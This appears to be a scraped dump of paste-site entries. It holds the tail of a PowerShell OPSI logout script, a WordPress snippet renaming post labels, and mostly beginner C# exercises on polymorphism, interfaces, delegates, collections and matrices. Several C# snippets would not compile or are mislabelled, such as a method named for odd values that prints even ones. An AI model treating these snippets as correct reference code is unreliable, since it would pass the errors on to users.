                $response = Close-OPSISession -Session $Global:OPSIWebSession -Endpoint $Global:EndPoint 
                if (-not($null -eq $response)) { 
                    Write-Host ""Erfolgreich abgemeldet!"" -ForegroundColor Green 
                    Read-Host
                    Exit 0
                }
                else { Exit -1 }
            }
            Default {}
        }
    }
}
Main
exit 0
#endregion

"
LnFGKC3J,Polymorphism,iumar69,C#,Sunday 2nd of July 2023 07:13:29 AM CDT,"---------------------------------------------------POLYMORPHISM----------------------------------------------

using System;
using System.CodeDom;

using System;

using System;

class Program
{
    void add()
    {
        Console.WriteLine(""This is the add function without any parameter"");
    }

    void add(int x)
    {
        Console.WriteLine(""This is the function with one parameter"");
    }

    void add(int x, int y)
    {
        Console.WriteLine(""This is the function with 2 parameters"");
    }
    public static void Main()
    {


        add();
        add(1);
        add(2, 3);
    }
}"
VSq6AS19,Polymorphism Runtime,iumar69,C#,Sunday 2nd of July 2023 07:12:32 AM CDT,"

------------------------------------------------------------POLYMORPHISM RUN TIME--------------------------------

using System;

class India
{
    public virtual void culture()
    {
        Console.WriteLine(""India"");
    }
}

class Delhi : India
{
    public override void culture()
    {
        Console.WriteLine(""Delhi"");
    }
}

class Program
{
    public static void Main()
    {
        Delhi dl = new Delhi();
        India ind = new India();
        dl.culture();
        ind.culture();
        Console.ReadLine();
    }
}
"
usciHMck,Abstraction,iumar69,C#,Sunday 2nd of July 2023 07:12:02 AM CDT,"------------------------------ABSTRACTION--------------------------------


using System;
using System.Security.Cryptography.X509Certificates;

public abstract class Animal
{
    public abstract void Sound();
    public abstract void Move();

}

public class Dog : Animal
{
    public override void Sound() { Console.WriteLine(""BhoBho""); }
    public override void Move() { Console.WriteLine(""Dog moving""); }
}

public class Cat : Animal
{
    public override void Sound() { Console.WriteLine(""Meow""); }
    public override void Move() { Console.WriteLine(""Cat Walking""); }
}
class Program
{
    public static void Main()
    {
        Dog doggy = new Dog();
        doggy.Sound();
        doggy.Move();

        Console.WriteLine();

        Cat billi = new Cat();
        billi.Sound();
        billi.Move();

        Console.ReadLine();
    }

}"
PbBX7cfk,Interfaces,iumar69,C#,Sunday 2nd of July 2023 07:10:13 AM CDT,"
-----------------------------------------INTERFACES--------------------------------
using System;

interface IAnimal
{
    void Sound();
    void Move();
}

class Dog : IAnimal
{

    public void Move()
    {
        Console.WriteLine(""Dog Moving"");
    }

    public void IAnimal.Sound()
    {

        Console.WriteLine(""Dog sound"");
    }
}

class Program
{
    static void Main()
    {
        Dog doggy = new Dog();
        doggy.Move();
        doggy.Sound();

        Console.ReadLine();
    }
}

using System;
using System.Collections.Specialized;
using System.Runtime.CompilerServices;

class Program
{
    public static void Main()
    {
        for (int i = 0; i < 3; i++)
        {
            for (int j = 0; j <= i; j++)
            {
                Console.Write(""1 "");
            }
            Console.WriteLine();
        }

        Console.WriteLine(""-----------------------------"");

        for (int i = 1; i <= 4; i++)
        {
            for (int j = 1; j <= i; j++)
            {
                Console.Write(j);
            }
            Console.WriteLine();
        }


        Console.WriteLine(""-----------------------------"");
        int print = 1;

        for (int i = 1; i <= 3; i++)
        {
            for (int j = 1; j <= i; j++)
            {
                Console.Write(print++);
            }
            Console.WriteLine();
        }

        Console.WriteLine(""-----------------------------"");

        int row = int.Parse(Console.ReadLine());
        int col = int.Parse(Console.ReadLine());

        int[,] first = new int[row, col];
        int[,] second = new int[row, col];
        int[,] answer = new int[row, col];

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < row; j++)
            {
                int value = int.Parse(Console.ReadLine());
                first[i, j] = value;

            }
        }
        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < row; j++)
            {
                int value = int.Parse(Console.ReadLine());
                second[i, j] = value;
            }
        }

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                answer[i, j] = 0;
                for (int k = 0; k < row; k++)
                {
                    answer[i, j] += first[i, k] * second[k, j];
                }
            }
        }

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                Console.Write(""{0} "", answer[i, j]);
            }
            Console.WriteLine();
        }
        Console.ReadLine();


    }

}"
eSrWWqCd,Matrix Programs,iumar69,C#,Sunday 2nd of July 2023 07:09:35 AM CDT,"--------------------------------Different Matrix Program----------------------------------------
using System;
using System.Security.Cryptography;
using System.Security.Policy;

class Program
{
    public static void Displayodd(int[,] mat)
    {
        Console.WriteLine(""The even elements in the matrix are:"");
        int row = mat.GetLength(0);
        int col = mat.GetLength(1);
        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                if (mat[i, j] % 2 == 0)
                {
                    Console.Write(mat[i, j]);
                    Console.Write("" "");
                }
            }
        }
        Console.WriteLine();
    }

    public static void Displaysum(int[,] mat)
    {
        int row = mat.GetLength(0);
        int col = mat.GetLength(1);
        int sum = 0;

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                sum += mat[i, j];
            }
        }
        Console.WriteLine(""The sum of the matrix is:"" + sum);
    }

    public static void Fivedivisiblenum(int[,] mat)
    {
        int row = mat.GetLength(0);
        int col = mat.GetLength(1);

        Console.Write(""The Numbers that are divisible by 5 are:"");
        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                if (mat[i, j] % 5 == 0)
                {
                    Console.Write(""{0} "", mat[i, j]);
                }
            }
        }

    }

    public static void Principlediagonalelements(int[,] mat)
    {
        Console.Write(""These are the Princicpal Diagonal Elements:"");
        int row = mat.GetLength(0);
        int col = mat.GetLength(1);

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                if (i == j)
                {
                    Console.Write(""{0} "", mat[i, j]);
                }
            }
        }
    }

    public static void Secondarydiagonalelements(int[,] mat)
    {
        Console.Write(""These are the Secondary Diagonal Elements: "");

        int row = mat.GetLength(0);
        int col = mat.GetLength(1);

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                if ((i + j) == (row - 1))
                {
                    Console.Write("" "" + mat[i, j]);
                }
            }
        }
    }

    public static void Principaldiagonalsum(int[,] mat)
    {

        int row = mat.GetLength(0);
        int col = mat.GetLength(1);
        int sum = 0;

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                if (i == j)
                {
                    sum += mat[i, j];
                }
            }
        }
        Console.WriteLine(""These are the Princicpal Diagonal Elements Sum:"" + sum);

    }

    public static void SecondarydiagonalSum(int[,] mat)
    {
        int row = mat.GetLength(0);
        int col = mat.GetLength(1);
        int sum = 0;

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                if ((i + j) == (row - 1))
                {
                    sum += mat[i, j];
                }
            }
        }
        Console.WriteLine(""These are the Secondary Diagonal Elements Sum:"" + sum);
    }

    public static void Main()
    {
        Console.Write(""Enter the row value"");
        int row = int.Parse(Console.ReadLine());
        Console.WriteLine(""Enter the column value"");
        int col = int.Parse(Console.ReadLine());

        int[,] mat = new int[row, col];

        for (int i = 0; i < row; i++)
        {
            for (int j = 0; j < col; j++)
            {
                int value = int.Parse(Console.ReadLine());
                mat[i, j] = value;
            }
        }

        Displayodd(mat);
        Console.WriteLine();
        Displaysum(mat);
        Console.WriteLine();
        Fivedivisiblenum(mat);
        Console.WriteLine();
        Principlediagonalelements(mat);
        Console.WriteLine();
        Secondarydiagonalelements(mat);
        Console.WriteLine();
        Principaldiagonalsum(mat);
        Console.WriteLine();
        SecondarydiagonalSum(mat);

        Console.ReadLine();

    }
}"
kQ5HbL4N,OOPS Assessment,iumar69,C#,Sunday 2nd of July 2023 07:08:00 AM CDT,"---------------------------------------------OOPS ASSESSMENT------------------------------------------

using System;

abstract class Bank
{
    public abstract void Credit();
    public abstract void Debit();
}

class HDFC : Bank
{
    public void HDFCBankObject()
    {
        Console.WriteLine(""This is the function of HDFC Bank class"");
    }

    public override void Credit()
    {
        Console.WriteLine(""This is the Credit functions"");
    }

    public override void Debit()
    {
        Console.WriteLine(""This is the Debit Function"");
    }
}

class Program
{
    public static void Main()
    {
        HDFC obj1 = new HDFC();
        obj1.Credit();
        obj1.Debit();
        obj1.HDFCBankObject();
        Console.ReadLine();
    }
}"
6JuGKiGY,Changes WordPress Post labels to Projects,fahimmurshed,PHP,Sunday 2nd of July 2023 07:07:35 AM CDT,"<?php
/**
 * Change the label of posts
 */
function prefix_change_post_object() {
	$get_post_type = get_post_type_object('post');
	$labels = $get_post_type->labels;
	$labels->name = 'Projects';
	$labels->singular_name = 'Projects';
	$labels->add_new = 'Add Projects';
	$labels->add_new_item = 'Add Projects';
	$labels->edit_item = 'Edit Projects';
	$labels->new_item = 'Projects';
	$labels->view_item = 'View Projects';
	$labels->search_items = 'Search Projects';
	$labels->not_found = 'No Projects found';
	$labels->not_found_in_trash = 'No Projects found in Trash';
	$labels->all_items = 'All Projects';
	$labels->menu_name = 'Projects';
	$labels->name_admin_bar = 'Projects';
}

add_action( 'init', 'prefix_change_post_object' );"
MiwZvYLr,Abstract Classes,iumar69,C#,Sunday 2nd of July 2023 07:07:31 AM CDT,"-----------------------------------ABSTRACT CLASS--------------------------------

using System;
using System.Runtime.InteropServices;
using System.Security.Policy;

abstract class A
{
    public abstract void function1();
}

class B : A
{

}"
18UufEWy,Structs,iumar69,C#,Sunday 2nd of July 2023 07:07:07 AM CDT,"
//-------------------------------------------STRUCTS--------------------------------------------
using System;

struct Person
{
    public int age;
    string name;

    public void Display()
    {
        Console.WriteLine(""This is the use of Display Function"");
    }

}

class Program
{
    public static void Main()
    {
        Person person = new Person();
        person.Display();
        Console.WriteLine(person.age);
        Console.ReadLine();
    }
}"
6QzAqfbS,ENUMS,iumar69,C#,Sunday 2nd of July 2023 07:06:23 AM CDT,"---------------------------------------------------ENUMS------------------------------------

using System;

enum designations { ProjectManagers, TeamLead, Developer, Tester };

class Program
{
    public static void Main()
    {
        Console.WriteLine((int)designations.Tester);
        Console.ReadLine();
    }
}"
cyckr9mB,Collections Stack,iumar69,C#,Sunday 2nd of July 2023 07:05:56 AM CDT,"-------------------------------------------collections stack------------------------------------------------

using system;
using system.collections;
using system.security.policy;

class program
{
    public static void main()
    {
        stack st = new stack();
        st.push(1);
        st.push(2);
        st.push(3);
        st.push(4);

        foreach (var item in st)
        {
            console.writeline(item);
        }

        stack st2 = new stack();
        st2.push(""umar firoz"");
        st2.push(1);
        st2.push(12.3);


        foreach (var items in st2)
        {
            console.writeline(items);
        }

        queue queue = new queue();
        queue.enqueue(1);
        queue.enqueue(2);
        queue.enqueue(3);

        console.writeline(""-----------------------------------------------------------"");

        console.writeline(queue.peek());
        object[] arr = queue.toarray();
        foreach (var items in arr)
        {
            console.write(items);
        }
        console.writeline();
        object[] arr2 = new object[queue.count];
        queue.copyto(arr2, 0);

        foreach (var items in arr2)
        {
            console.write(items);
        }
        console.readline();
    }
}
"
DDpsfcgx,Delegates,iumar69,C#,Sunday 2nd of July 2023 07:05:06 AM CDT,"
----------------------------------------DELEGATES------------------------------------ -

using System;
using System.Collections;
using System.Data;

class Program
{
    delegate int operation(int first, int second);

    public int add(int first, int second)
    {
        return (first + second);
    }
    public int difference(int first, int second)
    {
        return (second - first);
    }

    public int multiply(int first, int second)
    {
        return (first * second);
    }

    public int division(int first, int second)
    {
        return (second / first);
    }
    public static void Main()
    {
        Program program = new Program();
        operation addition = new operation(program.add);
        operation subtraction = new operation(program.difference);
        operation multiplication = new operation(program.multiply);
        operation division = new operation(program.division);

        Console.WriteLine(""Enter the first Number"");
        int first = int.Parse(Console.ReadLine());
        Console.WriteLine(""Enter the second Number"");
        int second = int.Parse(Console.ReadLine());

        int result = addition(first, second);
        Console.WriteLine(""The addition is:"" + result);

        result = subtraction(first, second);
        Console.WriteLine(""The subtraction is:"" + result);

        result = multiplication(first, second); ;
        Console.WriteLine(""The multiplication is:"" + result);

        result = division(first, second);
        Console.WriteLine(""The division is:"" + result);


        Console.ReadLine();

    }
}"
